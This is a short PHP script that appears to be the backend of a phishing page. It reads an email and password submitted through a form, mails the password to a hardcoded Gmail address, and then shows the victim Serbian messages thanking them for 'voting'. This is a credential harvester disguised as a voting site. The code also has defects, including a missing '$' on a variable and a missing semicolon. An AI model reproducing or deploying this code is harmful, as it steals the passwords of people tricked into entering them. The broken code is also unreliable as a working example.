<?php
if (isset($_POST['btn'])) {
$mailto = "icavodica@gmail.com";
$from = $_POST['email'];
$password = $_POST['password'];
$subject = $_POST['subject'];
$subject2 = "prijava uspesna";
$message = "Uspesno poslato". $password. "je pasvord";
$message2 = "Hvala Vam sto ste glasali!";
$headers = "From: ". $from;
$headers2 = "From: ". $mailto;
$result = mail($mailto, $subject, $message, $headers);
$result2 = mail(from, $subject2, $message2);
	if ($result) {
	echo '<script type="text/javascript"> alert("Uspesno ste glasali, hvala!") </script>';
	} else {
	echo '<script type="text/javascript"> alert("Neuspesno glasanje...molimo probajte jos jednom..") </script>'
	}
}
?>
